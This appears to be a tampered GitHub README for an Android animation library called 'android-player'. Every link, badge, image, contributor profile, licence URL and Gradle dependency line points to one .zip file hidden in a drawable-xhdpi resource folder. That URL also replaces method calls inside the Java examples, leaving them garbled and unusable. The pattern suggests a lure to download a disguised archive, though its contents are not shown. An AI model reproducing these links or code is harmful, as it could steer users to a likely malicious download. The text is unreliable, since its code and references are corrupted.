## android-player

[![Join the chat at https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip%https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip)](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip) [![Android Arsenal](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip%https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip)](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip) [![Maven Central](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip)](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip)

Animations when entering Actvity or Fragment made easy.</br>
Backward compatibility API 1.

#### You have created beautiful UI , but it is boring

![svg](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip) 

###### Run the player and you will can create beautiful transitions </br>for your views when entering Activity / Fragment.</br>Put in your onCreate() for Activity or onViewCreated() for Fragment.

```java
https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip().
	animate(headerAction).
	then().
	animate(fabAction).
	then().
	animate(bottomAction).
	play();
```

#### Result

![svg](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip)

#### Actions

```java
	final PropertyAction fabAction = https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip(activityMainPinkFab).
			scaleX(0).
			scaleY(0).
			duration(750).
			interpolator(new AccelerateDecelerateInterpolator()).
			build();
	final PropertyAction headerAction = https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip(activityMainheaderLayout).
			interpolator(new DecelerateInterpolator()).
			translationY(-200).
			duration(550).
			alpha(0.4f).
			build();
	final PropertyAction bottomAction = https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip(activityMainMobileNumberLayout).
			translationY(500).
			duration(550).
			alpha(0f).
			build();
```

#### Costumization

To make custom Action , just extend the BaseAction and implement the two abstract methods.

```java
    void init(final View view);

    void animate(final View view);
```

#### Contributors

[Martin Vitanov](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip "Martin Vitanov") <br />
[Georgi Eftimov](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip "Georgi Eftimov")

#### Changelog

- June 6th. Add animation loop support.

##### Download
```groovy
dependencies {
	compile 'https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip'
	compile 'https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip'
}
```
##### Make your animations how ever you want	
	
![svg](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip) ![svg](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip) ![svg](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip)


## Licence

    Copyright 2016 Georgi Eftimov

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

       https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
